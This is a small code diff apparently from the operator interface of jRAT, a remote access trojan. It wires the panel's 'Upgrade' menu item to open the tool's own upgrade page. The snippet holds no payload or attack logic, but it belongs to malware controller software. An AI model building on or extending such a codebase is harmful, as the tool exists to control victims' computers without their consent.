@@ -78,6 +78,7 @@ import pro.jrat.ui.renderers.table.MainTableRenderer;
 import pro.jrat.ui.renderers.table.PluginsTableRenderer;
 import pro.jrat.utils.FlagUtils;
 import pro.jrat.utils.IconUtils;
+import pro.jrat.utils.NetUtils;
 import pro.jrat.utils.Utils;
 
 
@@ -178,7 +179,7 @@ public class Frame extends BaseFrame {
 			JMenuItem mntmUpgrade = new JMenuItem("Upgrade");
 			mntmUpgrade.addActionListener(new ActionListener() {
 				public void actionPerformed(ActionEvent arg0) {
-					
+					NetUtils.openUrl(Constants.HOST + "/upgrade.php");
 				}
 			});
 			mntmUpgrade.setIcon(new ImageIcon(Frame.class.getResource("/icons/donate.png")));
